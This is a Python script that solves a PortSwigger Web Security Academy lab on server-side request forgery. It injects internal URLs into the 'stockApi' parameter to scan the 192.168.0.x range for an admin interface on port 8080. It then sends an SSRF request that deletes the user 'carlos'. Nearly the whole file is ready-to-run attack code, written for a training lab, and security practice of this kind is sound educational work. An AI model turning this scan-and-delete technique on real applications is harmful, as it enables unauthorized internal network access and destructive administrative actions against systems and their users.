#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 18/10/2023
#
# Lab: Basic SSRF against another back-end system
#
# Steps: 1. Inject payload into 'stockApi' parameter to scan the internal network
#        2. Delete carlos from the admin interface
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
url = "https://0a5700bf044cc0ce84d2b59a003e007a.web-security-academy.net"

print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "stockApi")

# loop over all possible numbers
for x in range(0,255):
    # payload to scan the internal network
    payload = f"http://192.168.0.{x}:8080/admin"

    # data to send via POST
    data =  {
        "stockApi": payload
    }

    try:
        # fetch the page with the injected payload
        res = requests.post(f"{url}/product/stock", data)

    except:
        print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.WHITE + "⦗1⦘ Injecting payload to scan the internal netwrok (" + Fore.YELLOW + f"192.168.0.{x}:8080/admin" + Fore.WHITE + ").. ", end="\r", flush=True)
    
    # if you found the internal server
    if res.status_code == 200:
        print(Fore.WHITE + "⦗1⦘ Injecting payload to scan the internal netwrok (" + Fore.YELLOW + f"192.168.0.{x}:8080/admin" + Fore.WHITE + ").. " + Fore.GREEN + "OK")
        
        # set data with the payload to delet carlos
        data = {
            "stockApi": f"{payload}/delete?username=carlos"
        }

        try:
            # delete carlos
            requests.post(f"{url}/product/stock", data, allow_redirects=False)

        except:
            print(Fore.RED + "[!] Failed to delete carlos through exception")
            exit(1)

        print(Fore.WHITE + "⦗2⦘ Deleting carlos from the admin interface.. " + Fore.GREEN + "OK")
        print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")

        # exit from the program
        exit(0)

